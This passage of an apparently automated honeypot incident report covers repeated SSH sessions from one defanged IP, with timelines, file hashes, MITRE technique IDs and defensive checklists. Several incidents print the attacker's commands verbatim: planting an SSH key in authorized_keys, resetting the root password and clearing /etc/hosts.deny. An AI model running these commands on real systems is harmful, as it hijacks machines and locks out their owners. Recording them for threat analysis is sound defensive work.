| `2026-04-07 19:53:55` | `cowrie.command.input` |
| `2026-04-07 19:53:55` | `cowrie.log.closed` |
| `2026-04-07 19:53:56` | `cowrie.session.params` |
| `2026-04-07 19:53:56` | `cowrie.command.input` |
| `2026-04-07 19:53:56` | `cowrie.log.closed` |
| `2026-04-07 19:53:57` | `cowrie.session.params` |
| `2026-04-07 19:53:57` | `cowrie.command.input` |
| `2026-04-07 19:53:57` | `cowrie.command.input` |
| `2026-04-07 19:53:57` | `cowrie.log.closed` |
| `2026-04-07 19:53:58` | `cowrie.session.params` |
| `2026-04-07 19:53:58` | `cowrie.command.input` |
| `2026-04-07 19:53:58` | `cowrie.log.closed` |
| `2026-04-07 19:53:59` | `cowrie.session.params` |
| `2026-04-07 19:53:59` | `cowrie.command.input` |
| `2026-04-07 19:53:59` | `cowrie.log.closed` |
| `2026-04-07 19:54:00` | `cowrie.session.params` |
| `2026-04-07 19:54:00` | `cowrie.command.input` |
| `2026-04-07 19:54:00` | `cowrie.log.closed` |
| `2026-04-07 19:54:01` | `cowrie.session.params` |
| `2026-04-07 19:54:01` | `cowrie.command.input` |
| `2026-04-07 19:54:01` | `cowrie.log.closed` |
| `2026-04-07 19:54:02` | `cowrie.session.params` |
| `2026-04-07 19:54:02` | `cowrie.command.input` |
| `2026-04-07 19:54:02` | `cowrie.log.closed` |
| `2026-04-07 19:54:03` | `cowrie.session.params` |
| `2026-04-07 19:54:03` | `cowrie.command.input` |
| `2026-04-07 19:54:03` | `cowrie.log.closed` |
| `2026-04-07 19:54:04` | `cowrie.session.params` |
| `2026-04-07 19:54:04` | `cowrie.command.input` |
| `2026-04-07 19:54:04` | `cowrie.log.closed` |
| `2026-04-07 19:54:05` | `cowrie.session.params` |
| `2026-04-07 19:54:05` | `cowrie.command.input` |
| `2026-04-07 19:54:05` | `cowrie.log.closed` |
| `2026-04-07 19:54:06` | `cowrie.session.params` |
| `2026-04-07 19:54:06` | `cowrie.command.input` |
| `2026-04-07 19:54:06` | `cowrie.log.closed` |
| `2026-04-07 19:54:07` | `cowrie.session.params` |
| `2026-04-07 19:54:07` | `cowrie.command.input` |
| `2026-04-07 19:54:07` | `cowrie.log.closed` |
| `2026-04-07 19:54:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.27.63[.]102` to AbuseIPDB if not already reported
- [ ] Block `2.27.63[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b48c7136cb7e

| Field | Detail |
|---|---|
| **Source IP** | `2.27.63[.]102` |
| **First Seen** | 2026-04-07 19:55 |
| **Last Seen** | 2026-04-07 19:56 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 19:55:59` | `cowrie.session.connect` |
| `2026-04-07 19:55:59` | `cowrie.client.version` |
| `2026-04-07 19:55:59` | `cowrie.client.kex` |
| `2026-04-07 19:56:00` | `cowrie.login.success` |
| `2026-04-07 19:56:01` | `cowrie.session.params` |
| `2026-04-07 19:56:01` | `cowrie.command.input` |
| `2026-04-07 19:56:01` | `cowrie.command.failed` |
| `2026-04-07 19:56:01` | `cowrie.log.closed` |
| `2026-04-07 19:56:02` | `cowrie.session.params` |
| `2026-04-07 19:56:02` | `cowrie.command.input` |
| `2026-04-07 19:56:03` | `cowrie.session.file_download` |
| `2026-04-07 19:56:03` | `cowrie.log.closed` |
| `2026-04-07 19:56:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.27.63[.]102` to AbuseIPDB if not already reported
- [ ] Block `2.27.63[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fae580c7b389

| Field | Detail |
|---|---|
| **Source IP** | `2.27.63[.]102` |
| **First Seen** | 2026-04-07 19:56 |
| **Last Seen** | 2026-04-07 19:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 19:56:09` | `cowrie.session.connect` |
| `2026-04-07 19:56:09` | `cowrie.client.version` |
| `2026-04-07 19:56:09` | `cowrie.client.kex` |
| `2026-04-07 19:56:10` | `cowrie.login.success` |
| `2026-04-07 19:56:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.27.63[.]102` to AbuseIPDB if not already reported
- [ ] Block `2.27.63[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bf2a83f2568

| Field | Detail |
|---|---|
| **Source IP** | `2.27.63[.]102` |
| **First Seen** | 2026-04-07 19:58 |
| **Last Seen** | 2026-04-07 19:58 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:n8pApojIJUAM"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 19:58:23` | `cowrie.session.connect` |
| `2026-04-07 19:58:23` | `cowrie.client.version` |
| `2026-04-07 19:58:23` | `cowrie.client.kex` |
| `2026-04-07 19:58:24` | `cowrie.login.success` |
| `2026-04-07 19:58:25` | `cowrie.session.params` |
| `2026-04-07 19:58:25` | `cowrie.command.input` |
| `2026-04-07 19:58:25` | `cowrie.command.failed` |
| `2026-04-07 19:58:25` | `cowrie.log.closed` |
| `2026-04-07 19:58:26` | `cowrie.session.params` |
| `2026-04-07 19:58:26` | `cowrie.command.input` |
| `2026-04-07 19:58:26` | `cowrie.session.file_download` |
| `2026-04-07 19:58:26` | `cowrie.log.closed` |
| `2026-04-07 19:58:37` | `cowrie.session.params` |
| `2026-04-07 19:58:37` | `cowrie.command.input` |
| `2026-04-07 19:58:37` | `cowrie.log.closed` |
| `2026-04-07 19:58:38` | `cowrie.session.params` |
| `2026-04-07 19:58:38` | `cowrie.command.input` |
| `2026-04-07 19:58:38` | `cowrie.log.closed` |
| `2026-04-07 19:58:39` | `cowrie.session.params` |
| `2026-04-07 19:58:39` | `cowrie.command.input` |
| `2026-04-07 19:58:39` | `cowrie.session.file_download` |
| `2026-04-07 19:58:39` | `cowrie.log.closed` |
| `2026-04-07 19:58:40` | `cowrie.session.params` |
| `2026-04-07 19:58:40` | `cowrie.command.input` |
| `2026-04-07 19:58:40` | `cowrie.log.closed` |
| `2026-04-07 19:58:41` | `cowrie.session.params` |
| `2026-04-07 19:58:41` | `cowrie.command.input` |
| `2026-04-07 19:58:41` | `cowrie.log.closed` |
| `2026-04-07 19:58:42` | `cowrie.session.params` |
| `2026-04-07 19:58:42` | `cowrie.command.input` |
| `2026-04-07 19:58:42` | `cowrie.command.input` |
| `2026-04-07 19:58:42` | `cowrie.log.closed` |
| `2026-04-07 19:58:43` | `cowrie.session.params` |
| `2026-04-07 19:58:43` | `cowrie.command.input` |
| `2026-04-07 19:58:43` | `cowrie.log.closed` |
| `2026-04-07 19:58:44` | `cowrie.session.params` |
| `2026-04-07 19:58:44` | `cowrie.command.input` |
| `2026-04-07 19:58:44` | `cowrie.log.closed` |
| `2026-04-07 19:58:45` | `cowrie.session.params` |
| `2026-04-07 19:58:45` | `cowrie.command.input` |
| `2026-04-07 19:58:45` | `cowrie.log.closed` |
| `2026-04-07 19:58:46` | `cowrie.session.params` |
| `2026-04-07 19:58:46` | `cowrie.command.input` |
| `2026-04-07 19:58:46` | `cowrie.log.closed` |
| `2026-04-07 19:58:47` | `cowrie.session.params` |
| `2026-04-07 19:58:47` | `cowrie.command.input` |
| `2026-04-07 19:58:47` | `cowrie.log.closed` |
| `2026-04-07 19:58:48` | `cowrie.session.params` |
| `2026-04-07 19:58:48` | `cowrie.command.input` |
| `2026-04-07 19:58:48` | `cowrie.log.closed` |
| `2026-04-07 19:58:49` | `cowrie.session.params` |
| `2026-04-07 19:58:49` | `cowrie.command.input` |
| `2026-04-07 19:58:49` | `cowrie.log.closed` |
| `2026-04-07 19:58:50` | `cowrie.session.params` |
| `2026-04-07 19:58:50` | `cowrie.command.input` |
| `2026-04-07 19:58:50` | `cowrie.log.closed` |
| `2026-04-07 19:58:51` | `cowrie.session.params` |
| `2026-04-07 19:58:51` | `cowrie.command.input` |
| `2026-04-07 19:58:51` | `cowrie.log.closed` |
| `2026-04-07 19:58:52` | `cowrie.session.params` |
| `2026-04-07 19:58:52` | `cowrie.command.input` |
| `2026-04-07 19:58:52` | `cowrie.log.closed` |
| `2026-04-07 19:58:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.27.63[.]102` to AbuseIPDB if not already reported
- [ ] Block `2.27.63[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f108b5fa94b

| Field | Detail |
|---|---|
| **Source IP** | `2.27.63[.]102` |
| **First Seen** | 2026-04-07 20:07 |
| **Last Seen** | 2026-04-07 20:08 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 20:07:49` | `cowrie.session.connect` |
| `2026-04-07 20:07:49` | `cowrie.client.version` |
| `2026-04-07 20:07:49` | `cowrie.client.kex` |
| `2026-04-07 20:07:50` | `cowrie.login.success` |
| `2026-04-07 20:07:51` | `cowrie.session.params` |
| `2026-04-07 20:07:51` | `cowrie.command.input` |
| `2026-04-07 20:07:51` | `cowrie.command.failed` |
| `2026-04-07 20:07:51` | `cowrie.log.closed` |
| `2026-04-07 20:07:52` | `cowrie.session.params` |
| `2026-04-07 20:07:52` | `cowrie.command.input` |
| `2026-04-07 20:07:52` | `cowrie.session.file_download` |
| `2026-04-07 20:07:52` | `cowrie.log.closed` |
| `2026-04-07 20:08:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.27.63[.]102` to AbuseIPDB if not already reported
- [ ] Block `2.27.63[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99e7d0083589

| Field | Detail |
|---|---|
| **Source IP** | `2.27.63[.]102` |
| **First Seen** | 2026-04-07 20:07 |
| **Last Seen** | 2026-04-07 20:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 20:07:59` | `cowrie.session.connect` |
| `2026-04-07 20:07:59` | `cowrie.client.version` |
| `2026-04-07 20:07:59` | `cowrie.client.kex` |
| `2026-04-07 20:08:00` | `cowrie.login.success` |
| `2026-04-07 20:08:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.27.63[.]102` to AbuseIPDB if not already reported
- [ ] Block `2.27.63[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f725f143261d

| Field | Detail |
|---|---|
| **Source IP** | `2.27.63[.]102` |
| **First Seen** | 2026-04-07 20:10 |
| **Last Seen** | 2026-04-07 20:10 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:8CJwNmbjiZQ8"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 20:10:10` | `cowrie.session.connect` |
| `2026-04-07 20:10:10` | `cowrie.client.version` |
| `2026-04-07 20:10:10` | `cowrie.client.kex` |
| `2026-04-07 20:10:14` | `cowrie.login.success` |
| `2026-04-07 20:10:14` | `cowrie.session.params` |
| `2026-04-07 20:10:14` | `cowrie.command.input` |
| `2026-04-07 20:10:14` | `cowrie.command.failed` |
| `2026-04-07 20:10:14` | `cowrie.log.closed` |
| `2026-04-07 20:10:15` | `cowrie.session.params` |
| `2026-04-07 20:10:15` | `cowrie.command.input` |
| `2026-04-07 20:10:15` | `cowrie.session.file_download` |
| `2026-04-07 20:10:15` | `cowrie.log.closed` |
| `2026-04-07 20:10:26` | `cowrie.session.params` |
| `2026-04-07 20:10:26` | `cowrie.command.input` |
| `2026-04-07 20:10:27` | `cowrie.log.closed` |
| `2026-04-07 20:10:27` | `cowrie.session.params` |
| `2026-04-07 20:10:27` | `cowrie.command.input` |
| `2026-04-07 20:10:27` | `cowrie.log.closed` |
| `2026-04-07 20:10:28` | `cowrie.session.params` |
| `2026-04-07 20:10:28` | `cowrie.command.input` |
| `2026-04-07 20:10:28` | `cowrie.session.file_download` |
| `2026-04-07 20:10:28` | `cowrie.log.closed` |
| `2026-04-07 20:10:29` | `cowrie.session.params` |
| `2026-04-07 20:10:29` | `cowrie.command.input` |
| `2026-04-07 20:10:30` | `cowrie.log.closed` |
| `2026-04-07 20:10:30` | `cowrie.session.params` |
| `2026-04-07 20:10:30` | `cowrie.command.input` |
| `2026-04-07 20:10:30` | `cowrie.log.closed` |
| `2026-04-07 20:10:31` | `cowrie.session.params` |
| `2026-04-07 20:10:31` | `cowrie.command.input` |
| `2026-04-07 20:10:31` | `cowrie.command.input` |
| `2026-04-07 20:10:31` | `cowrie.log.closed` |
| `2026-04-07 20:10:32` | `cowrie.session.params` |
| `2026-04-07 20:10:32` | `cowrie.command.input` |
| `2026-04-07 20:10:32` | `cowrie.log.closed` |
| `2026-04-07 20:10:33` | `cowrie.session.params` |
| `2026-04-07 20:10:33` | `cowrie.command.input` |
| `2026-04-07 20:10:33` | `cowrie.log.closed` |
| `2026-04-07 20:10:34` | `cowrie.session.params` |
| `2026-04-07 20:10:34` | `cowrie.command.input` |
| `2026-04-07 20:10:34` | `cowrie.log.closed` |
| `2026-04-07 20:10:35` | `cowrie.session.params` |
| `2026-04-07 20:10:35` | `cowrie.command.input` |
| `2026-04-07 20:10:35` | `cowrie.log.closed` |
| `2026-04-07 20:10:36` | `cowrie.session.params` |
| `2026-04-07 20:10:36` | `cowrie.command.input` |
| `2026-04-07 20:10:36` | `cowrie.log.closed` |
| `2026-04-07 20:10:37` | `cowrie.session.params` |
| `2026-04-07 20:10:37` | `cowrie.command.input` |
| `2026-04-07 20:10:37` | `cowrie.log.closed` |
| `2026-04-07 20:10:38` | `cowrie.session.params` |
| `2026-04-07 20:10:38` | `cowrie.command.input` |
| `2026-04-07 20:10:38` | `cowrie.log.closed` |
| `2026-04-07 20:10:39` | `cowrie.session.params` |
| `2026-04-07 20:10:39` | `cowrie.command.input` |
| `2026-04-07 20:10:39` | `cowrie.log.closed` |
| `2026-04-07 20:10:40` | `cowrie.session.params` |
| `2026-04-07 20:10:40` | `cowrie.command.input` |
| `2026-04-07 20:10:40` | `cowrie.log.closed` |
| `2026-04-07 20:10:41` | `cowrie.session.params` |
| `2026-04-07 20:10:41` | `cowrie.command.input` |
| `2026-04-07 20:10:41` | `cowrie.log.closed` |
| `2026-04-07 20:10:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.27.63[.]102` to AbuseIPDB if not already reported
- [ ] Block `2.27.63[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d93cfff6b2c7

| Field | Detail |
|---|---|
| **Source IP** | `2.27.63[.]102` |
| **First Seen** | 2026-04-07 20:12 |
| **Last Seen** | 2026-04-07 20:13 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:DIwChlmrsi8c"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 20:12:31` | `cowrie.session.connect` |
| `2026-04-07 20:12:31` | `cowrie.client.version` |
| `2026-04-07 20:12:31` | `cowrie.client.kex` |
| `2026-04-07 20:12:33` | `cowrie.login.success` |
| `2026-04-07 20:12:33` | `cowrie.session.params` |
| `2026-04-07 20:12:33` | `cowrie.command.input` |
| `2026-04-07 20:12:33` | `cowrie.command.failed` |
| `2026-04-07 20:12:34` | `cowrie.log.closed` |
| `2026-04-07 20:12:34` | `cowrie.session.params` |
| `2026-04-07 20:12:34` | `cowrie.command.input` |
| `2026-04-07 20:12:34` | `cowrie.session.file_download` |
| `2026-04-07 20:12:34` | `cowrie.log.closed` |
| `2026-04-07 20:12:45` | `cowrie.session.params` |
| `2026-04-07 20:12:45` | `cowrie.command.input` |
| `2026-04-07 20:12:45` | `cowrie.log.closed` |
| `2026-04-07 20:12:46` | `cowrie.session.params` |
| `2026-04-07 20:12:46` | `cowrie.command.input` |
| `2026-04-07 20:12:46` | `cowrie.log.closed` |
| `2026-04-07 20:12:47` | `cowrie.session.params` |
| `2026-04-07 20:12:47` | `cowrie.command.input` |
| `2026-04-07 20:12:47` | `cowrie.session.file_download` |
| `2026-04-07 20:12:47` | `cowrie.log.closed` |
| `2026-04-07 20:12:48` | `cowrie.session.params` |
| `2026-04-07 20:12:48` | `cowrie.command.input` |
| `2026-04-07 20:12:48` | `cowrie.log.closed` |
| `2026-04-07 20:12:49` | `cowrie.session.params` |
| `2026-04-07 20:12:49` | `cowrie.command.input` |
| `2026-04-07 20:12:49` | `cowrie.log.closed` |
| `2026-04-07 20:12:50` | `cowrie.session.params` |
| `2026-04-07 20:12:50` | `cowrie.command.input` |
| `2026-04-07 20:12:50` | `cowrie.command.input` |
| `2026-04-07 20:12:50` | `cowrie.log.closed` |
| `2026-04-07 20:12:51` | `cowrie.session.params` |
| `2026-04-07 20:12:51` | `cowrie.command.input` |
| `2026-04-07 20:12:51` | `cowrie.log.closed` |
| `2026-04-07 20:12:52` | `cowrie.session.params` |
| `2026-04-07 20:12:52` | `cowrie.command.input` |
| `2026-04-07 20:12:52` | `cowrie.log.closed` |
| `2026-04-07 20:12:53` | `cowrie.session.params` |
| `2026-04-07 20:12:53` | `cowrie.command.input` |
| `2026-04-07 20:12:53` | `cowrie.log.closed` |
| `2026-04-07 20:12:54` | `cowrie.session.params` |
| `2026-04-07 20:12:54` | `cowrie.command.input` |
| `2026-04-07 20:12:54` | `cowrie.log.closed` |
| `2026-04-07 20:12:55` | `cowrie.session.params` |
| `2026-04-07 20:12:55` | `cowrie.command.input` |
| `2026-04-07 20:12:55` | `cowrie.log.closed` |
| `2026-04-07 20:12:56` | `cowrie.session.params` |
| `2026-04-07 20:12:56` | `cowrie.command.input` |
| `2026-04-07 20:12:56` | `cowrie.log.closed` |
| `2026-04-07 20:12:57` | `cowrie.session.params` |
| `2026-04-07 20:12:57` | `cowrie.command.input` |
| `2026-04-07 20:12:57` | `cowrie.log.closed` |
| `2026-04-07 20:12:58` | `cowrie.session.params` |
| `2026-04-07 20:12:58` | `cowrie.command.input` |
| `2026-04-07 20:12:58` | `cowrie.log.closed` |
| `2026-04-07 20:12:59` | `cowrie.session.params` |
| `2026-04-07 20:12:59` | `cowrie.command.input` |
| `2026-04-07 20:12:59` | `cowrie.log.closed` |
| `2026-04-07 20:13:00` | `cowrie.session.params` |
| `2026-04-07 20:13:00` | `cowrie.command.input` |
| `2026-04-07 20:13:00` | `cowrie.log.closed` |
| `2026-04-07 20:13:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.27.63[.]102` to AbuseIPDB if not already reported
- [ ] Block `2.27.63[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e641dd857069

| Field | Detail |
|---|---|
| **Source IP** | `2.27.63[.]102` |
| **First Seen** | 2026-04-07 20:26 |
| **Last Seen** | 2026-04-07 20:26 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 20:26:37` | `cowrie.session.connect` |
| `2026-04-07 20:26:37` | `cowrie.client.version` |
| `2026-04-07 20:26:37` | `cowrie.client.kex` |
| `2026-04-07 20:26:38` | `cowrie.login.success` |
| `2026-04-07 20:26:39` | `cowrie.session.params` |
| `2026-04-07 20:26:39` | `cowrie.command.input` |
| `2026-04-07 20:26:39` | `cowrie.command.failed` |
| `2026-04-07 20:26:39` | `cowrie.log.closed` |
| `2026-04-07 20:26:40` | `cowrie.session.params` |
| `2026-04-07 20:26:40` | `cowrie.command.input` |
| `2026-04-07 20:26:40` | `cowrie.session.file_download` |
| `2026-04-07 20:26:40` | `cowrie.log.closed` |
| `2026-04-07 20:26:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.27.63[.]102` to AbuseIPDB if not already reported
